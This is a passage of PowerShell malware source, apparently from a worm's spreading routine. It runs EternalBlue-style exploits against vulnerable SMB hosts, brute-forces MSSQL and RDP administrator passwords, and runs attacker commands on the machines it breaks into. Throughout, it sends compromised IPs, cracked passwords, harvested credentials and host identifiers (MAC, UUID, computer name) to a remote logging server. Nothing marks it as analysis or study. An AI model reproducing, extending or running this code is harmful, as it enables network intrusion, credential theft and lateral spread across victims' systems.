					$vul=[PingCastle.Scanners.m17sc]::Scan($currip)
					if($vul){  
						write-host "$currip seems eb vulnerable..." 
						$res = eb7 $currip $sc_code   
						if($res) {
							write-host "$currip eb7 got it!!!" 
						} else {
							$res = eb8 $currip $sc_code
							if($res) {
								write-host "$currip eb8 got it!!!" 
							}
						}
					}
				}catch{}
				
			}
		}
		foreach($currip in $ms_portopen[1]) {
			$currip
			if (($old_portopen -notcontains $currip) -and ($currip.length -gt 6)){
				write-host "start mssql scanning..."
				for($n=0; $n -lt $allpass.count; $n++){
					write-host("Try pass: "+$allpass[$n])
					$flag = mssqlrun -ip $currip -pass $allpass[$n] -cmd $mscmd_code
					if($flag) {
						(New-Object Net.WebClient).DownloadString($log_url+'/report.json?type=ms&ip='+$currip+'&pass='+$allpass[$n]+'&t='+$t)
						break
					}
				}
			}
		}
		foreach($currip in $rdp_portopen[1]) {
			$currip
			if (($old_portopen -notcontains $currip) -and ($currip.length -gt 6)){
				write-host "start rdp scanning..."
				foreach($password in $allpass){
					write-host "Try pass:$password"
					$flag = (new-object RDP.BRUTE).check($exepath,$currip,"administrator",$password,$false)
					if($flag){
						write-host "SUCC!!"
						$brute = new-object RDP.BRUTE
						if($brute.check($exepath,$currip,"administrator",$password,$true)){
							(New-Object Net.WebClient).DownloadString($log_url+'/report.json?type=rdp&ip='+$currip+'&pass='+$password+'&t='+$t)
							[RDP.CMD]::runCmd($rdp_code)
							write-host "Try to run command!!"
						}
						start-sleep 10
						$brute.exit()
						break;
					}
				}
			}
		}
		
		$retry++
	
		write-host "reporting"
		try{
			$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where {$_.ipenabled -EQ $true}).Macaddress | select-object -first 1
			$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID
			$comp_name = $env:COMPUTERNAME
			$wf = test-path $env:tmp\wfreerdp.exe
			$mf = test-path $env:tmp\mimi.dat

			(New-Object Net.WebClient).DownloadString($log_url+'/log.json?V=0.1&ID='+$comp_name+'&GUID='+$guid+'&MAC='+$mac+'&retry='+$retry+'&pc1='+$portopen[1].count+'&pc2='+$ms_portopen[1].count+'&pc3='+$old_portopen[1].count+'&pc4='+$rdp_portopen[1].count+'&pci='+$ipaddrs
_i.count+'&pco='+$ipaddrs_o.count+'&pcb='+$global:ipaddrs_b+'&mi='+($getpasswd -join "^^")+'&wf='+[Int]$wf+'&mf='+[Int]$mf)
		}catch{}
	}
	
	"END"
}


________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
